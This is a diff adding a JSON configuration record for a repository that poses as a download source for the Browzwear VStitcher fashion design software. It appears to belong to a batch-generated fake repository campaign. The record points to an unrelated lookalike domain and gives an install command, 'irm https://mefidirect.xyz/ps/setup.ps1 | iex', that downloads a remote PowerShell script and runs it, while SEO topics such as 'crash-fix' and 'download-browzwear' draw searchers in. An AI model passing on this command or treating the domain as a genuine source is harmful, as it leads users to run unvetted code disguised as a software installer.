@@ -1,0 +1,29 @@
+{
+  "repo": "browzwear-vstitcher-pattern-design",
+  "product": "Browzwear VStitcher Pattern Design",
+  "kind": "fashion",
+  "install_type": "download",
+  "download_url": "https://browzwear.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "fashion",
+  "topics": [
+    "browzwear-release",
+    "browzwear-program",
+    "browzwear-fashion-design",
+    "browzwear-win10",
+    "browzwear-crash-fix",
+    "browzwear-setup-windows",
+    "browzwear-garment-design",
+    "browzwear-local-client",
+    "browzwear-quick-start",
+    "browzwear-start-2026",
+    "download-browzwear",
+    "windows-tools",
+    "cad-tools",
+    "desktop-tools",
+    "setup-guide"
+  ]
+}
